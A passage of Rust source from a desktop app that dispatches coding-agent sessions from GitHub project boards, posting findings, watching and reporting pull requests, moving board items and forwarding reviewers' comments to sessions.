                                .map_err(failed)
                                .err(),
                            None => Some("the board has no Needs decision column".to_string()),
                        }
                    };
                    Ok::<_, String>(Posted { url, move_error })
                })
                .await;
            let _ = this.update(cx, |this, cx| this.finish_posting(posting, result, cx));
        })
        .detach();
    }

    fn finish_posting(
        &mut self,
        posting: Posting,
        result: Result<Posted, String>,
        cx: &mut Context<Self>,
    ) {
        let Posting {
            record,
            path,
            outcome,
            points,
        } = posting;
        let key = round_key(&record);
        self.board.dispatch.posting.remove(&key);
        cx.notify();
        let Posted { url, move_error } = match result {
            Ok(posted) => posted,
            Err(message) => {
                let note = format!("Couldn't post the findings: {message}");
                let errors = &mut self.board.dispatch.post_errors;
                let first = errors.insert(key, (Instant::now(), note)).is_none();
                if first {
                    self.push_toast(
                        ToastKind::Err,
                        format!("Couldn't post the findings of #{}", record.number),
                        Some(message.into()),
                        cx,
                    );
                }
                return;
            }
        };

        let first_news = self.board.dispatch.findings_announced.insert(key.clone());
        let posted = PostedFindings {
            outcome,
            comment_url: url,
        };
        if outcome == Outcome::DecisionPoints {
            let discussion = Discussion {
                points,
                answers: Vec::new(),
            };
            self.board.dispatch.discussions.insert(record.content_id.clone(), discussion);
        }
        let saved = ProjectsConfig::load(&self.paths)
            .map_err(|err| format!("{err:#}"))
            .and_then(|mut next| {
                if record_posted_findings(&mut next, &record.item_id, &record.trigger_at, posted) {
                    next.save(&self.paths).map_err(|err| format!("{err:#}"))?;
                }
                Ok(next)
            });
        match saved {
            Ok(next) => {
                self.projects = next.clone();
                self.sidebar.update(cx, |sidebar, cx| {
                    sidebar.replace_projects(next);
                    cx.notify();
                });
            }
            Err(err) => {
                let note = format!("Findings posted, not saved: {err}");
                self.board.dispatch.post_errors.insert(key, (Instant::now(), note));
            }
        }
        if !first_news && move_error.is_none() {
            return;
        }

        let title = format!("Findings on #{}", record.number);
        let next_step = findings_next_step(outcome, record.kind);
        let detail = match &move_error {
            Some(err) => format!("{next_step} Couldn't move it to Needs decision: {err}"),
            None => next_step.to_string(),
        };
        let kind = if move_error.is_some() {
            ToastKind::Err
        } else {
            ToastKind::Ok
        };
        self.push_toast(kind, title.clone(), Some(detail.clone().into()), cx);
        let tab_title = self.tab_title_at(&path);
        self.push_notification(NotificationKind::SessionReady, title, detail, tab_title, cx);
        cx.notify();
    }

    /// Keep `record` on its worktree row in `projects.json`, read fresh so changes made since
    /// stay.
    fn save_record(
        &mut self,
        project_id: &str,
        path: &Path,
        branch: &str,
        record: WorktreeDispatch,
        cx: &mut Context<Self>,
    ) -> Result<(), String> {
        let path = path.to_string_lossy();
        let mut next = ProjectsConfig::load(&self.paths).map_err(|err| format!("{err:#}"))?;
        if !record_dispatch(&mut next, project_id, &path, branch, record) {
            return Err("the project no longer tracks the worktree".to_string());
        }
        next.save(&self.paths).map_err(|err| format!("{err:#}"))?;
        self.projects = next.clone();
        self.sidebar.update(cx, |sidebar, cx| {
            sidebar.replace_projects(next);
            cx.notify();
        });
        Ok(())
    }

    fn dispatch_record(
        &self,
        item_id: &str,
        cx: &App,
    ) -> Option<(String, PathBuf, Option<String>, WorktreeDispatch)> {
        self.dispatch_records(cx)
            .into_iter()
            .find(|(_, _, _, r)| r.item_id == item_id)
    }

    fn board_and_mapping(&self, board_url: &str) -> Option<(&Board, ColumnMapping)> {
        let board = self.board.reads_by_url.get(board_url)?.last_good.as_ref()?;
        let settings = self.settings.boards.iter().find(|b| b.url == board_url)?;
        Some((board, effective_mapping(board, &settings.columns)))
    }

    /// The role of the column `item_id` is in, on the last good read of `board_url`.
    fn item_role(&self, board_url: &str, item_id: &str) -> Option<ColumnRole> {
        let (board, mapping) = self.board_and_mapping(board_url)?;
        let item = board.items.iter().find(|item| item.id == item_id)?;
        board.role_of(item, &mapping)
    }

    /// The board at `board_url` and the id of its column with `role`, to move an item into.
    fn column_target(&self, board_url: &str, role: ColumnRole) -> Option<(Board, String)> {
        let (board, mapping) = self.board_and_mapping(board_url)?;
        let column = mapped_column(board, &mapping, role)?;
        Some((board.clone(), column.id.clone()))
    }

    /// Watch the pull request of every implementation and review round, and of research on an
    /// item that has one: read it; report it on the issue once per round, an implementation's as
    /// soon as it is open and a review's once its session is done; then move the item to In
    /// review once it is ready. Ring the bell when a session stopped without a result.
    pub(crate) fn watch_pull_requests(&mut self, cx: &mut Context<Self>) {
        let records: Vec<_> = self
            .dispatch_records(cx)
            .into_iter()
            .filter(|(_, _, _, r)| r.round != Round::Research || r.pull_request.is_some())
            .collect();
        self.board
            .dispatch
            .watches
            .retain(|id, _| records.iter().any(|(_, _, _, r)| r.item_id == *id));
        for (_, path, branch, record) in records {
            let Some(branch) = branch else {
                continue;
            };
            let role = self.item_role(&record.board_url, &record.item_id);
            let session = self
                .telemetry_at(&path)
                .map(|snapshot| (super::notified_state(&snapshot), snapshot.turn_count));
            let claude = session.is_some();
            let seen_from_start = self.board.dispatch.seen_from_start.contains(&round_key(&record));
            let watch = self
                .board
                .dispatch
                .watches
                .entry(record.item_id.clone())
                .or_default();
            watch.follow(&record.trigger_at, seen_from_start);
            watch.track(session);
            let posted = record.pull_request.as_ref().or(watch.reported.as_ref());
            let forwards = record.kind == ItemKind::Issue && record.round == Round::Implementation;
            let reported_at = posted.and_then(|p| p.reported_at.as_deref());
            let comments_from = comments_since(reported_at, record.forwarded.as_ref())
                .filter(|_| forwards)
                .map(String::from);
            let read = watch.read_due(role, posted.is_some());
            watch.reading |= read;
            let found = watch
                .pull_request
                .clone()
                .filter(|pr| pr.state == PullRequestState::Open);
            let report = found
                .clone()
                .filter(|_| posted.is_none() && !watch.reporting && retry_due(&watch.report_error));
            let reported = match record.round {
                Round::Implementation => true,
                Round::Review => review_round(&record, watch).report_url.is_some(),
                Round::Research => false,
            };
            let move_it = reported
                && posted.is_some_and(|p| !p.in_review)
                && found.is_some_and(|pr| moves_to_in_review(&pr, role))
                && !watch.moving
                && retry_due(&watch.move_error);
            watch.moving |= move_it;
            let ring = record.round == Round::Implementation
                && watch.waits_for_you()
                && watch.rang_for != watch.idle_since;
            if ring {
                watch.rang_for = watch.idle_since;
            }
            if read {
                self.read_pull_request(&record, branch, comments_from, cx);
            }
            if let Some(pr) = report {
                self.report_pull_request(&record, pr, cx);
            }
            if move_it {
                self.move_to_in_review(&record, cx);
            }
            if ring {
                let tab_title = self.tab_title_at(&path);
                self.push_notification(
                    NotificationKind::SessionWaiting,
                    format!("#{} waits for you", record.number),
                    "Implementation stopped without a pull request.",
                    tab_title,
                    cx,
                );
            }
            if record.round == Round::Review {
                self.check_review_round(&record, &path, claude, cx);
            }
        }
    }

    fn check_review_round(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        claude: bool,
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get(&record.item_id) else {
            return;
        };
        let review = review_round(record, watch);
        let due = review.report_url.is_none()
            && !watch.ending_review
            && retry_due(&watch.review_end_error);
        let open = watch.pull_request.clone().filter(|pr| pr.state == PullRequestState::Open);
        let Some(pr) = open.filter(|_| due) else {
            return;
        };
        let file = read_reply(path).filter(|_| review.reply_url.is_none());
        let reply = file.as_ref().map(|file| file.reply());
        let gate = self.session_at(path, cx);
        let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) else {
            return;
        };
        let settled = matches!(&gate, SessionAt::Done(remind)
            if !claude && !matches!(remind, Remind::Typing(_)));
        if settled {
            watch.settled_since.get_or_insert_with(Instant::now);
        } else {
            watch.settled_since = None;
        }
        let stop_checked = watch.stopped_without_result();
        let (session, remind) = match gate {
            SessionAt::Working => (ReviewSession::Working, Remind::Nothing),
            SessionAt::Held(by) => (ReviewSession::Held(by), Remind::Nothing),
            SessionAt::Done(remind) if settled => (ReviewSession::Settled { stop_checked }, remind),
            SessionAt::Done(remind) => {
                let session = ReviewSession::Claude {
                    stopped_after_work: watch.stopped_after_work(),
                    stop_checked,
                };
                (session, remind)
            }
        };
        let broken = matches!(reply, Some(Err(_)));
        let step = review_step(&pr, &review, reply, session);
        let held = match step {
            ReviewStep::Held(by) => Some(by),
            _ => None,
        };
        if watch.review_held != held || (!broken && watch.reply_reminder.is_some()) {
            watch.review_held = held;
            if !broken {
                watch.reply_reminder = None;
            }
            cx.notify();
        }
        match step {
            ReviewStep::FixReply(problems) => {
                if let Some(file) = file {
                    self.remind_reply(record, path, file.stamp, remind, &problems, cx);
                }
            }
            ReviewStep::End {
                reply,
                check_threads,
            } => self.end_review_round(record, pr, reply, check_threads, cx),
            ReviewStep::Wait | ReviewStep::Held(_) => {}
        }
    }

    fn end_review_round(
        &mut self,
        record: &WorktreeDispatch,
        pr: PullRequest,
        reply: Option<String>,
        check_threads: bool,
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) else {
            return;
        };
        watch.ending_review = true;
        let stop = watch.review_stop();
        cx.notify();
        let key = round_key(record);
        let end = ReviewEnd {
            item_id: record.item_id.clone(),
            content_id: record.content_id.clone(),
            kind: record.kind,
            since: record.trigger_at.clone(),
            pr: pr.clone(),
            start_head: record.review.as_ref().and_then(|r| r.start_head.clone()),
            reply,
            check_threads,
        };
        cx.spawn(async move |this, cx| {
            let ended = cx.background_spawn(async move { post_review_end(&end) }).await;
            let _ = this.update(cx, |this, cx| {
                this.finish_review_round(key, stop, pr, ended, cx);
            });
        })
        .detach();
    }

    fn finish_review_round(
        &mut self,
        key: RoundKey,
        stop: Option<Instant>,
        pr: PullRequest,
        ended: ReviewEnded,
        cx: &mut Context<Self>,
    ) {
        let current = self.dispatch_record(&key.0, cx).filter(|(_, _, _, r)| round_key(r) == key);
        let Some(watch) = self.board.dispatch.watches.get_mut(&key.0) else {
            return;
        };
        watch.ending_review = false;
        cx.notify();
        let Some((project_id, path, branch, mut record)) = current else {
            return;
        };
        let ReviewEnded {
            reply_url,
            report_url,
        } = ended;
        if reply_url.is_some() {
            watch.review_reply_url.clone_from(&reply_url);
            if let Err(err) = clear_reply(&path) {
                eprintln!("warning: couldn't remove {REPLY_FILE}: {err:#}");
            }
        }
        let report_url = match report_url {
            Ok(Some(url)) => {
                watch.review_end_error = None;
                watch.review_report_url = Some(url.clone());
                Some(url)
            }
            Ok(None) => {
                watch.review_end_error = None;
                watch.stop_without_result = stop;
                let ring = stop.is_some() && watch.review_stop() == stop && watch.rang_for != stop;
                if ring {
                    watch.rang_for = stop;
                    let tab_title = self.tab_title_at(&path);
                    self.push_notification(
                        NotificationKind::SessionWaiting,
                        format!("#{} waits for you", record.number),
                        "Review stopped without a push or a reply.",
                        tab_title,
                        cx,
                    );
                }
                None
            }
            Err(message) => {
                let first = watch.review_end_error.is_none();
                watch.review_end_error = Some((Instant::now(), message.clone()));
                if first {
                    let title = format!("Couldn't report the review of #{}", record.number);
                    self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
                }
                None
            }
        };
        if reply_url.is_none() && report_url.is_none() {
            return;
        }
        let review = record.review.get_or_insert_with(ReviewRound::default);
        review.reply_url = reply_url.or(review.reply_url.take());
        review.report_url.clone_from(&report_url);
        let branch = branch.unwrap_or_default();
        if let Err(err) = self.save_record(&project_id, &path, &branch, record.clone(), cx) {
            eprintln!("warning: couldn't record the review round: {err}");
        }
        if report_url.is_some() {
            self.announce_pull_request(&pr, &record, &path, "updated for", cx);
        }
    }

    fn read_pull_request(
        &mut self,
        record: &WorktreeDispatch,
        branch: String,
        comments_from: Option<String>,
        cx: &mut Context<Self>,
    ) {
        let item_id = record.item_id.clone();
        let repository = record.repository.clone();
        let kind = record.kind;
        let content_id = record.content_id.clone();
        let known = fresh_access(&self.board.dispatch.access);
        let started = Instant::now();
        cx.spawn(async move |this, cx| {
            let (branch, result, checked) = cx
                .background_spawn(async move {
                    let found = match kind {
                        ItemKind::PullRequest => github::fetch_pull_request(&content_id),
                        ItemKind::Issue | ItemKind::Draft => {
                            github::fetch_pull_requests(&repository, &branch)
                                .map(round_pull_request)
                        }
                    };
                    let mut checked = Vec::new();
                    if let (Ok(Some(pr)), Some(since)) = (&found, &comments_from) {
                        let comments = new_comments(pr, since);
                        for login in comments.iter().filter_map(|c| c.author.as_deref()) {
                            check_write_access(&repository, login, &known, &mut checked);
                        }
                    }
                    (branch, found, checked)
                })
                .await;
            let _ = this.update(cx, |this, cx| {
                this.board.dispatch.keep_access(checked);
                let Some(watch) = this.board.dispatch.watches.get_mut(&item_id) else {
                    return;
                };
                watch.reading = false;
                watch.read_at = Some(started);
                match result {
                    Ok(found) => {
                        watch.pull_request = found;
                        watch.read_ok_at = Some(started);
                    }
                    Err(err) => {
                        eprintln!("warning: couldn't read the pull request on {branch}: {err:#}")
                    }
                }
                cx.notify();
            });
        })
        .detach();
    }

    fn report_pull_request(
        &mut self,
        record: &WorktreeDispatch,
        pr: PullRequest,
        cx: &mut Context<Self>,
    ) {
        let item_id = record.item_id.clone();
        let content_id = record.content_id.clone();
        let body = pull_request_comment(&pr, record.round, record.kind);
        if let Some(watch) = self.board.dispatch.watches.get_mut(&item_id) {
            watch.reporting = true;
            watch.report_error = None;
        }
        cx.notify();
        cx.spawn(async move |this, cx| {
            let result = cx
                .background_spawn(async move {
                    github::add_comment(&content_id, &body).map_err(|err| format!("{err:#}"))
                })
                .await;
            let _ = this.update(cx, |this, cx| this.finish_report(&item_id, pr, result, cx));
        })
        .detach();
    }

    fn finish_report(
        &mut self,
        item_id: &str,
        pr: PullRequest,
        result: Result<NewComment, String>,
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get_mut(item_id) else {
            return;
        };
        watch.reporting = false;
        let comment = match result {
            Ok(comment) => comment,
            Err(message) => {
                watch.report_error = Some((Instant::now(), message.clone()));
                let title = format!("Couldn't report PR #{} on the issue", pr.number);
                self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
                return;
            }
        };
        let posted = PostedPullRequest {
            number: pr.number,
            url: pr.url.clone(),
            comment_url: comment.url,
            in_review: false,
            reported_at: Some(comment.created_at),
        };
        self.keep_posted(item_id, posted, cx);
        let Some((_, path, _, record)) = self.dispatch_record(item_id, cx) else {
            return;
        };
        self.announce_pull_request(&pr, &record, &path, "for", cx);
    }

    fn announce_pull_request(
        &mut self,
        pr: &PullRequest,
        record: &WorktreeDispatch,
        path: &Path,
        relation: &str,
        cx: &mut Context<Self>,
    ) {
        let subject = match record.kind {
            ItemKind::PullRequest => format!("PR #{} updated", pr.number),
            ItemKind::Issue | ItemKind::Draft => {
                format!("PR #{} {relation} #{}", pr.number, record.number)
            }
        };
        let (kind, toast, title, detail) = if pr.is_draft {
            let detail = match record.kind {
                ItemKind::PullRequest => "It moves to In review once it is marked ready.",
                ItemKind::Issue | ItemKind::Draft => {
                    "Test it by hand, then mark it ready for review."
                }
            };
            (
                NotificationKind::SessionWaiting,
                ToastKind::Info,
                format!("Draft {subject}"),
                detail.to_string(),
            )
        } else {
            (
                NotificationKind::SessionReady,
                ToastKind::Ok,
                subject,
                record.title.clone(),
            )
        };
        self.push_toast(toast, title.clone(), Some(detail.clone().into()), cx);
        let tab_title = self.tab_title_at(path);
        self.push_notification(kind, title, detail, tab_title, cx);
        cx.notify();
    }

    /// Save the reported pull request on its record; it stays in memory when that fails.
    fn keep_posted(&mut self, item_id: &str, posted: PostedPullRequest, cx: &mut Context<Self>) {
        let saved = match self.dispatch_record(item_id, cx) {
            Some((project_id, path, branch, mut record)) => {
                record.pull_request = Some(posted.clone());
                let branch = branch.unwrap_or_default();
                self.save_record(&project_id, &path, &branch, record, cx)
            }
            None => Err("the worktree is gone".to_string()),
        };
        if let Err(err) = &saved {
            eprintln!("warning: couldn't record the pull request: {err}");
        }
        if let Some(watch) = self.board.dispatch.watches.get_mut(item_id) {
            watch.reported = saved.is_err().then_some(posted);
        }
    }

    fn move_to_in_review(&mut self, record: &WorktreeDispatch, cx: &mut Context<Self>) {
        let item_id = record.item_id.clone();
        let Some((board, column)) = self.column_target(&record.board_url, ColumnRole::InReview)
        else {
            if let Some(watch) = self.board.dispatch.watches.get_mut(&item_id) {
                watch.moving = false;
            }
            return;
        };
        let number = record.number;
        cx.spawn(async move |this, cx| {
            let moved_id = item_id.clone();
            let result = cx
                .background_spawn(async move {
                    github::set_status(&board, &moved_id, &column).map_err(|err| format!("{err:#}"))
                })
                .await;
            let _ = this.update(cx, |this, cx| this.finish_move(&item_id, number, result, cx));
        })
        .detach();
    }

    fn finish_move(
        &mut self,
        item_id: &str,
        number: u32,
        result: Result<(), String>,
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get_mut(item_id) else {
            return;
        };
        watch.moving = false;
        if let Err(message) = result {
            watch.move_error = Some((Instant::now(), message.clone()));
            let title = format!("Couldn't move #{number} to In review");
            self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
            return;
        }
        watch.move_error = None;
        let reported = watch.reported.clone();
        let posted = self
            .dispatch_record(item_id, cx)
            .and_then(|(_, _, _, record)| record.pull_request)
            .or(reported);
        if let Some(posted) = posted {
            self.keep_posted(item_id, PostedPullRequest { in_review: true, ..posted }, cx);
        }
        self.refresh_boards(cx);
        cx.notify();
    }

    fn project_agent(&self, project: &Project) -> Option<AgentProfile> {
        project
            .default_agent_id
            .as_deref()
            .and_then(|id| self.agent_registry.get_by_id(id))
            .or_else(|| self.agent_registry.get_default())
            .cloned()
    }

    pub(crate) fn open_dispatch_tab(
        &mut self,
        board_url: &str,
        item_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let Some((project_id, path, branch, _)) = self
            .dispatch_records(cx)
            .into_iter()
            .find(|(_, _, _, r)| r.board_url == board_url && r.item_id == item_id)
        else {
            return;
        };
        if !path.is_dir() {
            let folder = path.file_name().unwrap_or(path.as_os_str()).to_string_lossy();
            let detail = format!("Its worktree folder {folder} is gone.");
            self.push_toast(ToastKind::Err, "Can't open its session", Some(detail.into()), cx);
            return;
        }
        self.show_workspace(cx);
        if self.focus_or_reopen(&path, window, cx) {
            return;
        }
        let Some(project) = self.current_projects(cx).project(&project_id).cloned() else {
            return;
        };
        let profile = self.project_agent(&project);
        let auto_type = profile.as_ref().and_then(codescope_core::build_new_session_auto_type);
        let mut title = codescope_core::TabTitle::project(project.name);
        if let Some(branch) = branch.as_deref() {
            title.set_branch(branch);
        }
        self.spawn_tab_in(
            Some(path),
            Some(title),
            auto_type.map(Into::into),
            profile.map(|profile| profile.id.into()),
            None,
            None,
            window,
            cx,
        );
    }

    /// Ask whether to start fork pull request `item_id` on its last move, and start it on yes.
    pub(crate) fn confirm_fork_start(
        &mut self,
        item_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let found = self.board.reads_by_url.values().find_map(|read| {
            let (board, triggers) = (read.last_good.as_ref()?, read.triggers.as_ref()?);
            let item = board.items.iter().find(|item| item.id == item_id)?;
            let content_id = item.content_id.as_ref()?;
            let head = triggers.heads.get(content_id)?.clone();
            let moved_at = triggers.changes.get(content_id)?.created_at.clone();
            Some((item.number?, head, moved_at))
        });
        let Some((number, head, moved_at)) = found else {
            return;
        };
        let (title, message, detail) = fork_warning(number, &head);
        let spec = ConfirmSpec::confirm(title, message)
            .with_detail(detail)
            .with_confirm_label("Start")
            .with_cancel_label("Not now");
        let answer = self.open_confirm_dialog(spec, window, cx);
        let item_id = item_id.to_string();
        cx.spawn_in(window, async move |this, cx| {
            if !answer.await.unwrap_or(false) {
                return;
            }
            let _ = this.update_in(cx, |this, window, cx| {
                this.board.dispatch.fork_confirmed.insert(item_id, moved_at);
                this.run_dispatch(window, cx);
                cx.notify();
            });
        })
        .detach();
    }

    /// Mark the draft pull request of `item_id` ready for review; the next watch moves the item
    /// to In review.
    pub(crate) fn ready_for_review(&mut self, item_id: &str, cx: &mut Context<Self>) {
        let Some(watch) = self.board.dispatch.watches.get_mut(item_id) else {
            return;
        };
        let draft = watch
            .pull_request
            .clone()
            .filter(|pr| pr.is_draft && pr.state == PullRequestState::Open);
        let Some(pr) = draft.filter(|_| !watch.marking_ready) else {
            return;
        };
        watch.marking_ready = true;
        cx.notify();
        let item_id = item_id.to_string();
        cx.spawn(async move |this, cx| {
            let id = pr.id.clone();
            let result = cx
                .background_spawn(async move {
                    github::mark_ready_for_review(&id).map_err(|err| format!("{err:#}"))
                })
                .await;
            let _ = this.update(cx, |this, cx| {
                this.finish_ready_for_review(&item_id, pr, result, cx);
            });
        })
        .detach();
    }

    fn finish_ready_for_review(
        &mut self,
        item_id: &str,
        pr: PullRequest,
        result: Result<(), String>,
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get_mut(item_id) else {
            return;
        };
        watch.marking_ready = false;
        if let Err(message) = result {
            let title = format!("Couldn't mark PR #{} ready for review", pr.number);
            self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
            return;
        }
        let ready = PullRequest {
            is_draft: false,
            ..pr
        };
        watch.pull_request = Some(ready.clone());
        let role = self
            .dispatch_record(item_id, cx)
            .and_then(|(_, _, _, r)| self.item_role(&r.board_url, item_id));
        let detail = moves_to_in_review(&ready, role)
            .then(|| SharedString::from("It moves to In review."));
        let title = format!("PR #{} is ready for review", ready.number);
        self.push_toast(ToastKind::Ok, title, detail, cx);
        self.watch_pull_requests(cx);
        cx.notify();
    }

    pub(crate) fn run_handovers(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let records: Vec<_> = self
            .dispatch_records(cx)
            .into_iter()
            .filter(|(_, _, _, r)| r.kind == ItemKind::Issue && r.round == Round::Implementation)
            .collect();
        for (project_id, path, branch, record) in records {
            let Some(branch) = branch else {
                continue;
            };
            let place = (project_id.as_str(), path.as_path(), branch.as_str());
            let mut working = None;
            let record = self.forward_comments(place, record, &mut working, window, cx);
            self.run_repair(place, &record, &mut working, window, cx);
        }
    }

    fn is_working(&self, path: &Path, cx: &App, known: &mut Option<bool>) -> bool {
        *known.get_or_insert_with(|| {
            matches!(self.session_at(path, cx), SessionAt::Working | SessionAt::Held(_))
        })
    }

    fn handover_route(
        &self,
        (project_id, path, branch): (&str, &Path, &str),
        message: &str,
        cx: &App,
    ) -> Option<Route> {
        match self.handover_target(path, cx) {
            HandoverTarget::Type(terminal) => return Some(Route::Type(terminal)),
            HandoverTarget::NewTab => {}
            HandoverTarget::Wait(_) => return None,
        }
        let project = self.current_projects(cx).project(project_id)?;
        let profile = self.project_agent(project)?;
        let command = codescope_core::build_new_session_auto_type(&profile)
            .and_then(|launch| launch_with_task(&launch, message))?;
        let mut title = codescope_core::TabTitle::project(project.name.clone());
        title.set_branch(branch);
        Some(Route::Launch(Launch {
            project_id: project_id.to_string(),
            title,
            agent_id: profile.id.clone(),
            command,
        }))
    }

    fn deliver(
        &mut self,
        path: &Path,
        route: Route,
        message: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        match route {
            Route::Type(terminal) => Self::submit_line(&terminal, message, cx),
            Route::Launch(launch) => self.hand_over(path, None, launch, message, window, cx),
        }
    }

    fn forward_comments(
        &mut self,
        place: (&str, &Path, &str),
        record: WorktreeDispatch,
        working: &mut Option<bool>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> WorktreeDispatch {
        let path = place.1;
        let Some((pr, step)) = self.next_forward(&record, path, working, cx) else {
            self.note_forward(&record, path, None, cx);
            return record;
        };
        let note = match step {
            ForwardStep::Nothing => None,
            ForwardStep::Waits(names) => Some(ForwardNote::Waits(names)),
            ForwardStep::Working(names) => Some(ForwardNote::Working(names)),
            ForwardStep::Stopped(names) => Some(ForwardNote::Stopped(names)),
            ForwardStep::PostReply(body) => {
                self.post_forward_reply(&record, &pr, body, cx);
                Some(ForwardNote::Posting)
            }
            ForwardStep::FixReply(problems) => {
                self.fix_forward_reply(&record, path, &problems, cx);
                Some(ForwardNote::FixReply)
            }
            ForwardStep::Forward(comments) => {
                let names = authors(&comments);
                match self.start_forward(place, &record, &pr, &comments, window, cx) {
                    Some(handed) => {
                        self.note_forward(&handed, path, Some(ForwardNote::Working(names)), cx);
                        return handed;
                    }
                    None => Some(ForwardNote::Waits(names)),
                }
            }
        };
        self.note_forward(&record, path, note, cx);
        record
    }

    fn next_forward(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        working: &mut Option<bool>,
        cx: &App,
    ) -> Option<(PullRequest, ForwardStep)> {
        let watch = self.board.dispatch.watches.get(&record.item_id)?;
        let posted = record.pull_request.as_ref().or(watch.reported.as_ref())?;
        let pr = watch.pull_request.clone()?;
        let forwarded = record.forwarded.as_ref();
        let since = comments_since(posted.reported_at.as_deref(), forwarded).map(String::from);
        let unreplied = forwarded.is_some_and(|last| last.reply_url.is_none());
        let reply = read_reply(path).filter(|_| unreplied);
        let open = forwarded.is_some_and(|last| last.is_open(&pr));
        let now = Instant::now();
        let outsider = |login: &str| {
            self.board.dispatch.can_write(&record.repository, login, now) == Some(false)
        };
        let fresh = since.as_deref().is_some_and(|since| {
            new_comments(&pr, since)
                .iter()
                .filter_map(|comment| comment.author.as_deref())
                .any(|login| !outsider(login))
        });
        if !open && reply.is_none() && !fresh {
            return Some((pr, ForwardStep::Nothing));
        }
        let role = self.item_role(&record.board_url, &record.item_id);
        let working = self.is_working(path, cx, working);
        let state = &mut self.board.dispatch;
        let watch = state.watches.get_mut(&record.item_id)?;
        let turns = watch.turns;
        watch.forward_follow.look(forwarded.map(|last| last.at.clone()), working, turns);
        let session = watch.forward_follow.session(working, unreplied, watch.read_ok_at);
        let current = watch.read_after_stop();
        let can_write = |login: &str| state.can_write(&record.repository, login, now);
        let facts = ForwardFacts {
            since: since.as_deref(),
            forwarded,
            session,
            reply: reply.as_ref().map(|file| file.reply()),
            role,
        };
        let step = match forward_step(&pr, facts, can_write) {
            ForwardStep::Forward(comments) if !current => ForwardStep::Waits(authors(&comments)),
            step => step,
        };
        Some((pr, step))
    }

    fn start_forward(
        &mut self,
        place: (&str, &Path, &str),
        record: &WorktreeDispatch,
        pr: &PullRequest,
        comments: &[PullRequestComment],
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Option<WorktreeDispatch> {
        let (project_id, path, branch) = place;
        let watch = self.board.dispatch.watches.get(&record.item_id);
        let failed_at = watch.and_then(|watch| watch.forward_failed_at);
        if failed_at.is_some_and(|at| at.elapsed() < POST_RETRY) {
            return None;
        }
        let message = forward_message(record.number, comments.len());
        let route = self.handover_route(place, &message, cx)?;
        let names = authors(comments);
        let at = codescope_core::time::now_iso8601();
        let handed = WorktreeDispatch {
            forwarded: Some(Forwarded {
                until: comments.last()?.created_at.clone(),
                at: at.clone(),
                authors: names.clone(),
                head: pr.head_oid.clone(),
                reply_url: None,
            }),
            repair: None,
            ..record.clone()
        };
        let saved = clear_reply(path)
            .and_then(|()| write_task_file(path, &forward_task(record, pr, comments)))
            .map_err(|err| format!("{err:#}"))
            .and_then(|()| self.save_record(project_id, path, branch, handed.clone(), cx));
        if let Err(message) = saved {
            if let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) {
                watch.forward_failed_at = Some(Instant::now());
            }
            let title = format!("Couldn't hand the comments on #{} to its session", record.number);
            self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
            return None;
        }
        if let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) {
            let turns = watch.turns;
            watch.forward_follow.start(at, turns);
            watch.reply_reminder = None;
        }
        self.deliver(path, route, message, window, cx);
        let title = format!("{} commented on PR #{}", named(&names), pr.number);
        let detail = format!("Handed to the session of #{}.", record.number);
        self.push_toast(ToastKind::Ok, title, Some(detail.into()), cx);
        Some(handed)
    }

    fn post_forward_reply(
        &mut self,
        record: &WorktreeDispatch,
        pr: &PullRequest,
        body: String,
        cx: &mut Context<Self>,
    ) {
        let Some(handed_at) = record.forwarded.as_ref().map(|last| last.at.clone()) else {
            return;
        };
        let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) else {
            return;
        };
        if watch.forward_posting || !retry_due(&watch.forward_post_error) {
            return;
        }
        watch.forward_posting = true;
        cx.notify();
        let item_id = record.item_id.clone();
        let subject = pr.id.clone();
        let number = pr.number;
        cx.spawn(async move |this, cx| {
            let (target, since) = (item_id.clone(), handed_at.clone());
            let posted = cx
                .background_spawn(async move { post_once(&target, &subject, &since, &body) })
                .await;
            let _ = this.update(cx, |this, cx| {
                this.finish_forward_reply(&item_id, number, &handed_at, posted, cx);
            });
        })
        .detach();
    }

    fn finish_forward_reply(
        &mut self,
        item_id: &str,
        number: u32,
        handed_at: &str,
        posted: Result<String, String>,
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get_mut(item_id) else {
            return;
        };
        watch.forward_posting = false;
        cx.notify();
        let url = match posted {
            Ok(url) => {
                watch.forward_post_error = None;
                url
            }
            Err(message) => {
                let first = watch.forward_post_error.is_none();
                watch.forward_post_error = Some((Instant::now(), message.clone()));
                if first {
                    let title = format!("Couldn't post the reply on PR #{number}");
                    self.push_toast(ToastKind::Err, title, Some(message.into()), cx);
                }
                return;
            }
        };
        let Some((project_id, path, branch, mut record)) = self.dispatch_record(item_id, cx) else {
            return;
        };
        let Some(last) = record.forwarded.as_mut().filter(|last| last.at == handed_at) else {
            return;
        };
        last.reply_url = Some(url);
        let names = named(&last.authors);
        let branch = branch.unwrap_or_default();
        if let Err(err) = self.save_record(&project_id, &path, &branch, record, cx) {
            eprintln!("warning: couldn't record the reply on PR #{number}: {err}");
            return;
        }
        if let Err(err) = clear_reply(&path) {
            eprintln!("warning: couldn't remove {REPLY_FILE}: {err:#}");
        }
        let title = format!("Reply posted on PR #{number}");
        self.push_toast(ToastKind::Ok, title, Some(format!("It answers {names}.").into()), cx);
    }

    fn fix_forward_reply(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        problems: &[Problem],
